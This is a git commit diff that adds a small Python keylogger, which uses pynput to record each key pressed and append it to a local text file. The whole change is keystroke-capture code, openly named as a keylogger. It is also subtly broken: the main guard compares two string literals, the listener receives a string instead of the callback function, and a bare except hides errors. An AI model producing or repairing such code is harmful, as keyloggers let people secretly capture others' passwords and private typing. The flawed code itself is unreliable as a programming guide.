9b9f3a805b2e3bc1e5fd5a2752b951f4a631288b
KenishRaghu <kenishr08@gmail.com>
2024-12-13 15:10:01 -0500

    final run

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,21 @@
 from pynput import keyboard
 
+def keypressed(key):
+    print("Key pressed: ")
+    print(str(key))
+    if str(key) == "Key.esc":
+        return False
+    else:
+        with open("keyFile.txt", "a") as log:
+            try:
+                char = key.char
+                log.write(char)
+            except:
+                print("Error")
+
+
 
 if "__name__" == "__main__":
-       
+    listener = keyboard.Listener(on_press="keypressed")
+    listener.start()
+    input()
